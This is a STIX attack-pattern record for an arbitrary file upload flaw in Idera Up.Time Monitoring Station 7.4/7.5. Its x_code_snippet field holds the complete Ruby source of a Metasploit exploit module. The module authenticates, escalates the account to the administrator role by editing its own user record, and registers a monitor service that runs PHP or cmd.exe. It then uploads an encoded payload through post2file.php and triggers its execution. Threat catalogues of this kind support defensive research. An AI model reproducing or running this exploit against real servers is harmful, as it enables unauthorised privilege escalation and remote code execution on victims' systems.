{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--10d2a3ea-e47b-4360-90d5-ea6ec0fa900c",
    "created": "2024-08-14T17:07:38.391572Z",
    "modified": "2024-08-14T17:07:38.391576Z",
    "name": "Idera Up.Time Monitoring Station 7.4 post2file.php Arbitrary File Upload",
    "description": " This module exploits a vulnerability found in Uptime version 7.4.0 and 7.5.0.  The vulnerability began as a classic arbitrary file upload vulnerability in post2file.php which can be exploited by exploits/multi/http/uptime_file_upload_1.rb, but it was mitigated by the vendor.  Although the mitigation in place will prevent uptime_file_upload_1.rb from working, it can still be bypassed and gain privilege escalation, and allows the attacker to upload file again, and execute arbitrary commands.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/uptime_file_upload_2.rb",
            "external_id": "uptime_file_upload_2.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5254.php"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'nokogiri'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Idera Up.Time Monitoring Station 7.4 post2file.php Arbitrary File Upload',\n      'Description'     => %q{\n        This module exploits a vulnerability found in Uptime version 7.4.0 and 7.5.0.\n\n        The vulnerability began as a classic arbitrary file upload vulnerability in post2file.php,\n        which can be exploited by exploits/multi/http/uptime_file_upload_1.rb, but it was mitigated\n        by the vendor.\n\n        Although the mitigation in place will prevent uptime_file_upload_1.rb from working, it\n        can still be bypassed and gain privilege escalation, and allows the attacker to upload file\n        again, and execute arbitrary commands.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Denis Andzakovic', # Found file upload bug in post2file.php in 2013\n          'Ewerson Guimaraes(Crash) <crash[at]dclabs.com.br>',\n          'Gjoko Krstic(LiquidWorm) <gjoko[at]zeroscience.mk>'\n        ],\n      'References'      =>\n        [\n          ['EDB', '37888'],\n          ['URL', 'http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5254.php']\n        ],\n       'Platform'       => ['php'],\n       'Arch'           => ARCH_PHP,\n       'Targets'        => [['Automatic', {}]],\n       'Privileged'     => 'true',\n       'DefaultTarget'  => 0,\n       # The post2file.php vuln was reported in 2013 by Denis Andzakovic. And then on Aug 2015,\n       # it was discovered again by Ewerson 'Crash' Guimaraes.\n       'DisclosureDate' => '2013-11-18'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(9999),\n        OptString.new('USERNAME', [true, 'The username to authenticate as', 'sample']),\n        OptString.new('PASSWORD', [true, 'The password to authenticate with', 'sample'])\n      ])\n\n    register_advanced_options(\n      [\n        OptString.new('UptimeWindowsDirectory', [true, 'Uptime installation path for Windows', 'C:\\\\Program Files\\\\uptime software\\\\']),\n        OptString.new('UptimeLinuxDirectory', [true, 'Uptime installation path for Linux', '/usr/local/uptime/']),\n        OptString.new('CmdPath', [true, 'Path to cmd.exe', 'c:\\\\windows\\\\system32\\\\cmd.exe'])\n      ])\n  end\n\n  def print_status(msg='')\n    super(\"#{rhost}:#{rport} - #{msg}\")\n  end\n\n  def print_error(msg='')\n    super(\"#{rhost}:#{rport} - #{msg}\")\n  end\n\n  def print_good(msg='')\n    super(\"#{rhost}:#{rport} - #{msg}\")\n  end\n\n  # Application Check\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path)\n    )\n\n    unless res\n      vprint_error(\"Connection timed out.\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    n = Nokogiri::HTML(res.body)\n    uptime_text = n.at('//ul[@id=\"uptimeInfo\"]//li[contains(text(), \"up.time\")]')\n\n    if uptime_text\n      version = uptime_text.text.scan(/up\\.time ([\\d\\.]+)/i).flatten.first\n      vprint_status(\"Found version: #{version}\")\n      if version >= '7.4.0' && version <= '7.5.0'\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def create_exec_service(*args)\n    cookie_split, rhost, uploadpath, phppath, phpfile_name, cmd, cmdargs = *args\n    res_service = send_request_cgi(\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, 'main.php'),\n      'cookie' => \"#{cookie_split[1]}; #{cookie_split[2]}\",\n      'vars_get' => {\n        'section'          => 'ERDCInstance',\n        'subsection'       => 'add',\n      },\n      'vars_post' => {\n        'initialERDCId' => '20',\n        'target' => '1',\n        'targetType' => 'systemList',\n        'systemList' => '1',\n        'serviceGroupList' => '-10',\n        'initialMode' => 'standard',\n        'erdcName' => 'Exploit',\n        'erdcInitialName' => '',\n        'erdcDescription' => 'Exploit',\n        'hostButton' => 'system',\n        'erdc_id' => '20',\n        'forceReload' => '0',\n        'operation' => 'standard',\n        'erdc_instance_id' => '',\n        'label_[184]' => 'Script Name',\n        'value_[184]' => cmd,\n        'id_[184]' => 'process',\n        'name_[process]' => '184',\n        'units_[184]' => '',\n        'guiBasic_[184]' => '1',\n        'inputType_[184]' => 'GUIString',\n        'screenOrder_[184]' => '1',\n        'parmType_[184]' => '1',\n        'label_[185]' => 'Arguments',\n        'value_[185]' => cmdargs,\n        'id_[185]' => 'args',\n        'name_[args]' => '185',\n        'units_[185]' => '',\n        'guiBasic_[185]' => '1',\n        'inputType_[185]' => 'GUIString',\n        'screenOrder_[185]' => '2',\n        'parmType_[185]' => '1',\n        'label_[187]' => 'Output',\n        'can_retain_[187]' => 'false',\n        'comparisonWarn_[187]' => '-1',\n        'comparison_[187]' => '-1',\n        'id_[187]' => 'value_critical_output',\n        'name_[output]' => '187',\n        'units_[187]' => '',\n        'guiBasic_[187]' => '1',\n        'inputType_[187]' => 'GUIString',\n        'screenOrder_[187]' => '4',\n        'parmType_[187]' => '2',\n        'label_[189]' => 'Response time',\n        'can_retain_[189]' => 'false',\n        'comparisonWarn_[189]' => '-1',\n        'comparison_[189]' => '-1',\n        'id_[189]' => 'value_critical_timer',\n        'name_[timer]' => '189',\n        'units_[189]' => 'ms',\n        'guiBasic_[189]' => '0',\n        'inputType_[189]' => 'GUIInteger',\n        'screenOrder_[189]' => '6',\n        'parmType_[189]' => '2',\n        'timing_[erdc_instance_monitored]' => '1',\n        'timing_[timeout]' => '60',\n        'timing_[check_interval]' => '10',\n        'timing_[recheck_interval]' => '1',\n        'timing_[max_rechecks]' => '3',\n        'alerting_[notification]' => '1',\n        'alerting_[alert_interval]' => '120',\n        'alerting_[alert_on_critical]' => '1',\n        'alerting_[alert_on_warning]' => '1',\n        'alerting_[alert_on_recovery]' => '1',\n        'alerting_[alert_on_unknown]' => '1',\n        'time_period_id' => '1',\n        'pageFinish' => 'Finish',\n        'pageContinue' => 'Continue...',\n        'isWizard' => '1',\n        'wizardPage' => '2',\n        'wizardNumPages' => '2',\n        'wizardTask' => 'pageFinish',\n        'visitedPage[1]' => '1',\n        'visitedPage[2]' => '1'\n      })\n  end\n\n  def exploit\n    vprint_status('Trying to login...')\n    # Application Login\n    res_auth = send_request_cgi(\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, 'index.php'),\n      'vars_post' => {\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      })\n\n    unless res_auth\n      fail_with(Failure::Unknown, 'Connection timed out while trying to login')\n    end\n\n    # Check OS\n    phpfile_name = rand_text_alpha(10)\n    if res_auth.headers['Server'] =~ /Unix/\n      vprint_status('Found Linux installation - Setting appropriated PATH')\n      phppath = Rex::FileUtils.normalize_unix_path(datastore['UptimeLinuxDirectory'], 'apache/bin/ph')\n      uploadpath = Rex::FileUtils.normalize_unix_path(datastore['UptimeLinuxDirectory'], 'GUI/wizards')\n\n      cmdargs = \"#{uploadpath}#{phpfile_name}.txt\"\n      cmd = phppath\n    else\n      vprint_status('Found Windows installation - Setting appropriated PATH')\n      phppath = Rex::FileUtils.normalize_win_path(datastore['UptimeWindowsDirectory'], 'apache\\\\php\\\\php.exe')\n      uploadpath = Rex::FileUtils.normalize_win_path(datastore['UptimeWindowsDirectory'], 'uptime\\\\GUI\\\\wizards\\\\')\n      cmd = datastore['CmdPath']\n      cmdargs = \"/K \\\"\\\"#{phppath}\\\" \\\"#{uploadpath}#{phpfile_name}.txt\\\"\\\"\"\n    end\n\n    if res_auth.get_cookies =~ /login=true/\n      cookie = Regexp.last_match(1)\n      cookie_split = res_auth.get_cookies.split(';')\n      vprint_status(\"Cookies Found: #{cookie_split[1]} #{cookie_split[2]}\")\n      print_good('Login success')\n\n      # Privilege escalation getting user ID\n      res_priv = send_request_cgi(\n        'method' => 'GET',\n        'uri'    => normalize_uri(target_uri.path, 'main.php'),\n        'vars_get' => {\n          'page'    => 'Users',\n          'subPage' => 'UserContainer'\n        },\n       'cookie' => \"#{cookie_split[1]}; #{cookie_split[2]}\"\n      )\n\n      unless res_priv\n        fail_with(Failure::Unknown, 'Connection timed out while getting userID.')\n      end\n\n      matchdata = res_priv.body.match(/UPTIME\\.CurrentUser\\.userId\\.*/)\n\n      unless matchdata\n        fail_with(Failure::Unknown, 'Unable to find userID for escalation')\n      end\n\n      get_id = matchdata[0].gsub(/[^\\d]/, '')\n      vprint_status('Escalating privileges...')\n\n      # Privilege escalation post\n      res_priv_elev = send_request_cgi(\n        'method' => 'POST',\n        'uri'    => normalize_uri(target_uri.path, 'main.php'),\n        'vars_get' => {\n          'section'          => 'UserContainer',\n          'subsection'       => 'edit',\n          'id'               => \"#{get_id}\"\n        },\n        'cookie' => \"#{cookie_split[1]}; #{cookie_split[2]}\",\n        'vars_post' => {\n          'operation' => 'submit',\n          'disableEditOfUsernameRoleGroup' => 'false',\n          'username' => datastore['USERNAME'],\n          'password' => datastore['PASSWORD'],\n          'passwordConfirm' => datastore['PASSWORD'],\n          'firstname' => rand_text_alpha(10),\n          'lastname' => rand_text_alpha(10),\n          'location' => '',\n          'emailaddress' => '',\n          'emailtimeperiodid' => '1',\n          'phonenumber' => '',\n          'phonenumbertimeperiodid' => '1',\n          'windowshost' => '',\n          'windowsworkgroup' => '',\n          'windowspopuptimeperiodid' => '1',\n          'landingpage' => 'MyPortal',\n          'isonvacation' => '0',\n          'receivealerts' => '0',\n          'activexgraphs' => '0',\n          'newuser' => '1',\n          'userroleid' => '1',\n          'usergroupid[]' => '1'\n        }\n      )\n\n      unless res_priv_elev\n        fail_with(Failure::Unknown, 'Connection timed out while escalating...')\n      end\n\n      # Refresing perms\n      vprint_status('Refreshing perms...')\n      res_priv = send_request_cgi(\n        'method' => 'GET',\n        'uri'    => normalize_uri(target_uri.path, 'index.php?loggedout'),\n        'cookie' => \"#{cookie_split[1]}; #{cookie_split[2]}\"\n      )\n\n      unless res_priv\n        fail_with(Failure::Unknown, 'Connection timed out while refreshing perms')\n      end\n\n      res_auth = send_request_cgi(\n        'method' => 'POST',\n        'uri'    => normalize_uri(target_uri.path, 'index.php'),\n        'vars_post' => {\n          'username' => datastore['USERNAME'],\n          'password' => datastore['PASSWORD']\n        }\n      )\n\n      unless res_auth\n        fail_with(Failure::Unknown, 'Connection timed out while authenticating...')\n      end\n\n      if res_auth.get_cookies =~ /login=true/\n        cookie = Regexp.last_match(1)\n        cookie_split = res_auth.get_cookies.split(';')\n        vprint_status(\"New Cookies Found: #{cookie_split[1]} #{cookie_split[2]}\")\n        print_good('Priv. Escalation success')\n      end\n\n      # CREATING Linux EXEC Service\n      if res_auth.headers['Server'] =~ /Unix/\n        vprint_status('Creating Linux Monitor Code exec...')\n        create_exec_service(cookie_split, rhost, uploadpath, phppath, phpfile_name, cmd, cmdargs)\n\n      else\n        # CREATING Windows EXEC Service#\n        vprint_status('Creating Windows Monitor Code exec...')\n        create_exec_service(cookie_split, rhost, uploadpath, phppath, phpfile_name, cmd, cmdargs)\n      end\n\n      # Upload file\n      vprint_status('Uploading file...')\n      up_res = send_request_cgi(\n        'method' => 'POST',\n        'uri'    => normalize_uri(target_uri.path, 'wizards', 'post2file.php'),\n        'vars_post' => {\n          'file_name' => \"#{phpfile_name}.txt\",\n          'script'    => payload.encoded\n        }\n      )\n\n      unless up_res\n        fail_with(Failure::Unknown, 'Connection timed out while uploading file.')\n      end\n\n      vprint_status('Checking Uploaded file...')\n      res_up_check = send_request_cgi(\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'wizards', \"#{phpfile_name}.txt\")\n      )\n\n      if res_up_check && res_up_check.code == 200\n        print_good(\"File found: #{phpfile_name}\")\n      else\n        print_error('File not found')\n        return\n      end\n\n      # Get Monitor ID\n\n      vprint_status('Fetching Monitor ID...')\n      res_mon_id = send_request_cgi(\n        'method' => 'GET',\n        'uri'    => normalize_uri(target_uri.path, 'ajax', 'jsonQuery.php'),\n        'cookie' => \"#{cookie_split[1]}; #{cookie_split[2]}\",\n        'vars_get' => {\n          'query'               => 'GET_SERVICE_PAGE_ERDC_LIST',\n          'iDisplayStart'       => '0',\n          'iDisplayLength'      => '10',\n          'sSearch'             => 'Exploit'\n        }\n       )\n\n      unless res_mon_id\n        fail_with(Failure::Unknown, 'Connection timed out while fetching monitor ID')\n      end\n\n      matchdata = res_mon_id.body.match(/id=?[^>]*>/)\n\n      unless matchdata\n        fail_with(Failure::Unknown, 'No monitor ID found in HTML body. Unable to continue.')\n      end\n\n      mon_get_id = matchdata[0].gsub(/[^\\d]/, '')\n      print_good(\"Monitor id aquired:#{mon_get_id}\")\n      # Executing monitor\n      send_request_cgi(\n        'method' => 'POST',\n        'uri'    => normalize_uri(target_uri.path, 'main.php'),\n        'cookie' => \"#{cookie_split[1]}; #{cookie_split[2]}\",\n        'vars_post' => {\n          'section'    => 'RunERDCInstance',\n          'subsection' => 'view',\n          'id'         => mon_get_id,\n          'name'       => 'Exploit'\n        }\n      )\n    else\n      print_error('Cookie not found')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-11-18",
    "x_mitre_platforms": [
        "['php']"
    ]
}